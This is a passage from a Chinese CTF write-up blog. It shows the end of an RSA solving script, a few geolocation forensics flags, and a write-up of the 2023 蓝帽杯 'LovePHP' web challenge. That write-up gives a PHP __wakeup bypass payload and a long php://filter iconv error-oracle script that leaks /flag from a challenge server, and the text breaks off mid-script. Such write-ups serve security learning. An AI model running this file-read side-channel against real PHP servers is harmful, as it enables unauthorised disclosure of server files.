class="number">68123067052840097285002963401518347625939222208495512245264898037784706226045178539672509359795737570458454279990340789711761542570505016930986418403583534761200927746744298082254959321108829717070206277856970403191060311901559017372393931121345743640657503994132925993800497309703877076541759570410784984067</span></span><br><span class="line">hint1 = <span class="number">564294243979930441832363430202216879765636227726919016842676871868826273613344463155168512928428069316237289920953421495330355385445649203238665802121198919543532254290185502622234014832349396422316629991217252686524462096711723580</span></span><br><span class="line">hint2 = <span class="number">484307144682854466149980416084532076579378210225500554261260145338511061452958092407101769145891750844383042274498826787696953308289632616886162073232218214504005935332891893378072083589751354946391146889055039887781077066257013110</span></span><br><span class="line">c = <span class="number">57751903193610662622957432730720223801836323458721550133101805763463060486486266309568004721657732742899781400754207249733137375171400440423755473421971160000575072519031824740691618617905549725344323721903857290320737224300672847773455169809689188843070599176261204013341324705808617411345132933937680951713</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">bar = tqdm(total=(<span class="number">1</span>&lt;&lt;<span class="number">12</span>)**<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> x1, x2 <span class="keyword">in</span> tqdm(product(<span class="built_in">range</span>(<span class="number">1</span>&lt;&lt;<span class="number">12</span>,<span class="number">1</span>&lt;&lt;<span class="number">13</span>), repeat=<span class="number">2</span>)):</span><br><span class="line">    q = gcd(hint1*x1 -hint2*x2,n)</span><br><span class="line">    bar.update(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> q != <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;q=&#x27;</span>,q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p = n//q</span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi_n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">pow</span>(c, d, n))[<span class="number">2</span>:]))</span><br></pre></td></tr></table></div></figure>




        <h1 id="Forensics">
          <a href="#Forensics" class="heading-link"><i class="fas fa-link"></i></a><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1>
      
        <h3 id="购物之旅">
          <a href="#购物之旅" class="heading-link"><i class="fas fa-link"></i></a><a href="#购物之旅" class="headerlink" title="购物之旅"></a>购物之旅</h3>
      <p>SICTF{北京市_顺义区_新顺南大街_北京华联顺义金街购物中心}</p>

        <h3 id="美女姐姐">
          <a href="#美女姐姐" class="heading-link"><i class="fas fa-link"></i></a><a href="#美女姐姐" class="headerlink" title="美女姐姐"></a>美女姐姐</h3>
      <p>SICTF{福建省福州市仓山区烟台山公园}</p>

        <h3 id="宝塔镇河妖">
          <a href="#宝塔镇河妖" class="heading-link"><i class="fas fa-link"></i></a><a href="#宝塔镇河妖" class="headerlink" title="宝塔镇河妖"></a>宝塔镇河妖</h3>
      <p>SICTF{山东省济宁市汶上县太子灵踪塔}</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/09/02/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%20%20%E5%88%9D%E8%B5%9Bweb%E9%A2%98%E8%A7%A3%E4%B9%8BLovePHP/">2023蓝帽杯  初赛web题解之LovePHP</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-09-02</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-10-21</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="2023蓝帽杯-初赛web题解之LovePHP">
          <a href="#2023蓝帽杯-初赛web题解之LovePHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#2023蓝帽杯-初赛web题解之LovePHP" class="headerlink" title="2023蓝帽杯  初赛web题解之LovePHP"></a>2023蓝帽杯  初赛web题解之LovePHP</h1>
      <p>比赛过去好久了，才想起来把这道题给复现一下，前些天忙着学车了，也没空，明天开学了，今天来复现一下。过了好久也没环境了，只能来本地试试了</p>
<p><img src="/2023/09/02/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%20%20%E5%88%9D%E8%B5%9Bweb%E9%A2%98%E8%A7%A3%E4%B9%8BLovePHP/AAwangzhan\blog2\themes\butterfly\source\img\image-20230902140749820.png"></p>
<p>源码看上去不难看懂，最主要有两个考点，file和反序列化的wakeup绕过</p>
<p>我们首先看一个小坑</p>
<p>由于php字符串解析的问题</p>
<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
<ul>
<li>删除空白符</li>
<li>将某些字符（ [ 空格 + . ）转换为下划线</li>
</ul>
<p><strong>实际应用：</strong></p>
<ul>
<li>get传参111_aa,不能直接传时，传111_aa。<br> &#x2F;&#x2F;php的变量解析绕过，[ 被处理成 _</li>
<li>当[提前出现后，后面的 . 就不会再被转义成_了。</li>
<li>当这些字符为首字母时，只有点号会被替换成下划</li>
</ul>
<p>所以这个题传参要用my[sercet.flag</p>
<p>知道了这个我们再来看wakeup怎么过吧，这个题目的php版本是7.43版的，跟那个cve-2016-7124版本对不上，上网搜了一下高版本php怎么让wakeup，要用C绕过<strong>C:8:”Saferman”:0:{}</strong></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本地调试</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saferman</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span> = True;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;check === True)&#123;</span><br><span class="line">            <span class="comment">/*file(file_put_contents(&#x27;php://filter/write=convert.base64-decode/resource=1.txt&#x27;,&#x27;PD9waHAgcGhwaW5mbygpOz8+&#x27;));</span></span><br><span class="line"><span class="comment">            var_dump(file(&#x27;data://text/plain,&lt;?php system(\&#x27;ls\&#x27;);?&gt;&#x27;));*/</span></span><br><span class="line">            <span class="comment">//file(eval(&#x27;system(&quot;dir&quot;);&#x27;));</span></span><br><span class="line">            <span class="title function_ invoke__">file</span>(<span class="string">&#x27;&lt;?php eval(\&#x27;system(\&#x27;ls\&#x27;)\&#x27;)?&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;check=False;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//phpinfo();</span></span><br><span class="line"> <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;C:8:&quot;Saferman&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p><img src="/2023/09/02/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%20%20%E5%88%9D%E8%B5%9Bweb%E9%A2%98%E8%A7%A3%E4%B9%8BLovePHP/AAwangzhan\blog2\themes\butterfly\source\img\image-20230902143938070.png" alt="image-20230902143938070"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playload：?my[secret.flag=C:8:&quot;Saferman&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></div></figure>

<p>接着绕过file</p>
<p><code>file()</code>函数读取文件后把内容储存到数组中，并不回显，最后找到两篇文章借鉴</p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.zeddyu.info/2022/09/27/2022-09-28-TheEndOfAFR/">https://blog.zeddyu.info/2022/09/27/2022-09-28-TheEndOfAFR/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://boogipop.com/2023/05/08/Web%E4%BE%A7%E4%BF%A1%E9%81%93%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/">https://boogipop.com/2023/05/08/Web%E4%BE%A7%E4%BF%A1%E9%81%93%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><strong>侧信道攻击</strong>   侧信道其实就是根据一个二元或者多元条件关系差，可以让我们以”盲注”的形式，去获取某些信息的一种方法，测信道广义上是非常广泛的。在web题目中他们通常以盲注的形式出现。而这里的file函数里面是可以用filter伪协议的</p>
<p>得到了一个侧信道攻击脚本</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">THE GRAND IDEA:</span></span><br><span class="line"><span class="string">We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE</span></span><br><span class="line"><span class="string">filter will blow up the string length by 4x every time it is used, which will quickly cause</span></span><br><span class="line"><span class="string">500 error if and only if the string is non empty. So we now have an oracle that tells us if</span></span><br><span class="line"><span class="string">the string is empty.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">THE GRAND IDEA 2:</span></span><br><span class="line"><span class="string">The dechunk filter is interesting.</span></span><br><span class="line"><span class="string">https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724</span></span><br><span class="line"><span class="string">It looks like it was implemented for something http related, but for our purposes, the interesting</span></span><br><span class="line"><span class="string">behavior is that if the string contains no newlines, it will wipe the entire string if and only if</span></span><br><span class="line"><span class="string">the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our</span></span><br><span class="line"><span class="string">above oracle! In fact we can verify that since the flag starts with D that the filter chain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">does not cause a 500 error.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">THE REST:</span></span><br><span class="line"><span class="string">So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent</span></span><br><span class="line"><span class="string">into madness trying to figure out ways to:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- somehow get other characters not at the start of the flag file to the front</span></span><br><span class="line"><span class="string">- detect more precisely which character is at the front</span></span><br><span class="line"><span class="string">  &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">join</span>(<span class="params">*x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;|&#x27;</span>.join(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">err</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">raise</span> ValueError</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req</span>(<span class="params">s</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> requests.get(<span class="string">&#x27;http://39.105.5.7:49227/?my[secret.flag=C:8:%22Saferman%22:0:&#123;&#125;&amp;secret=&#x27;</span>+<span class="string">f&#x27;php://filter/<span class="subst">&#123;s&#125;</span>/resource=/flag&#x27;</span>).status_code == <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">blow_up_enc = join(*[<span class="string">&#x27;convert.quoted-printable-encode&#x27;</span>]*<span class="number">1000</span>)</span><br><span class="line">blow_up_utf32 = <span class="string">&#x27;convert.iconv.L1.UCS-4LE&#x27;</span></span><br><span class="line">blow_up_inf = join(*[blow_up_utf32]*<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">header = <span class="string">&#x27;convert.base64-encode|convert.base64-encode&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start get baseline blowup</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Calculating blowup&#x27;</span>)</span><br><span class="line">baseline_blowup = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    payload = join(*[blow_up_utf32]*n)</span><br><span class="line">    <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;payload&#125;</span>&#x27;</span>):</span><br><span class="line">        baseline_blowup = n</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;baseline blowup is <span class="subst">&#123;baseline_blowup&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">trailer = join(*[blow_up_utf32]*(baseline_blowup-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> req(<span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>) == <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;detecting equals&#x27;</span>)</span><br><span class="line">j = [</span><br><span class="line">    req(<span class="string">f&#x27;convert.base64-encode|convert.base64-encode|<span class="subst">&#123;blow_up_enc&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>),</span><br><span class="line">    req(<span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode<span class="subst">&#123;blow_up_enc&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>),</span><br><span class="line">    req(<span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|<span class="subst">&#123;blow_up_enc&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>)</span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(j)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">sum</span>(j) != <span class="number">2</span>:</span><br><span class="line">    err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> j[<span class="number">0</span>] == <span class="literal">False</span>:</span><br><span class="line">    header = <span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> j[<span class="number">1</span>] == <span class="literal">False</span>:</span><br><span class="line">    header = <span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> j[<span class="number">2</span>] == <span class="literal">False</span>:</span><br><span class="line">    header = <span class="string">f&#x27;convert.base64-encode|convert.base64-encode&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;j: <span class="subst">&#123;j&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;header: <span class="subst">&#123;header&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Step two:</span></span><br><span class="line"><span class="string">Now we have something of the form</span></span><br><span class="line"><span class="string">[a-zA-Z0-9 things]==</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Here the pain begins. For a long time I was trying to find something that would allow me to strip</span></span><br><span class="line"><span class="string">successive characters from the start of the string to access every character. Maybe something like</span></span><br><span class="line"><span class="string">that exists but I couldn&#x27;t find it. However, if you play around with filter combinations you notice</span></span><br><span class="line"><span class="string">there are filters that *swap* characters:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:</span></span><br><span class="line"><span class="string">abcdefgh -&gt; badcfehg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:</span></span><br><span class="line"><span class="string">abcdefgh -&gt; dcbahgfe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This allows us to access the first four characters of the string. Can we do better? It turns out</span></span><br><span class="line"><span class="string">YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff&gt;&lt;0xfe&gt; to the start of</span></span><br><span class="line"><span class="string">the string:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">abcdefgh -&gt; &lt;0xff&gt;&lt;0xfe&gt;abcdefgh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The idea being that if we now use the r4 gadget, we get something like:</span></span><br><span class="line"><span class="string">ba&lt;0xfe&gt;&lt;0xff&gt;fedc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid</span></span><br><span class="line"><span class="string">&lt;0xfe&gt;&lt;0xff&gt; to get:</span></span><br><span class="line"><span class="string">bafedc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th</span></span><br><span class="line"><span class="string">characters of the string. There&#x27;s only one problem: our r4 gadget requires that the string length</span></span><br><span class="line"><span class="string">is a multiple of 4. The original base64 string will be a multiple of four by definition, so when</span></span><br><span class="line"><span class="string">we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no</span></span><br><span class="line"><span class="string">good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it</span></span><br><span class="line"><span class="string">turns out, if we apply the filter</span></span><br><span class="line"><span class="string">convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It will turn the == into:</span></span><br><span class="line"><span class="string">+---AD0-3D3D+---AD0-3D3D</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">And this is magic, because this corrects such that when we apply the</span></span><br><span class="line"><span class="string">convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Let&#x27;s recap. We have a string like:</span></span><br><span class="line"><span class="string">abcdefghij==</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:</span></span><br><span class="line"><span class="string">abcdefghij+---AD0-3D3D+---AD0-3D3D</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apply convert.iconv.CSUNICODE.CSUNICODE:</span></span><br><span class="line"><span class="string">&lt;0xff&gt;&lt;0xfe&gt;abcdefghij+---AD0-3D3D+---AD0-3D3D</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apply r4 gadget:</span></span><br><span class="line"><span class="string">ba&lt;0xfe&gt;&lt;0xff&gt;fedcjihg---+-0DAD3D3---+-0DAD3D3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apply base64-decode | base64-encode, so the &#x27;-&#x27; and high bytes will disappear:</span></span><br><span class="line"><span class="string">bafedcjihg+0DAD3D3+0DAD3Dw==</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Then apply r4 once more:</span></span><br><span class="line"><span class="string">efabijcd0+gh3DAD0+3D3DAD==wD</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">And here&#x27;s the cute part: not only have we now accessed the 5th and 6th chars of the string, but</span></span><br><span class="line"><span class="string">the string still has two equals signs in it, so we can reapply the technique as many times as we</span></span><br><span 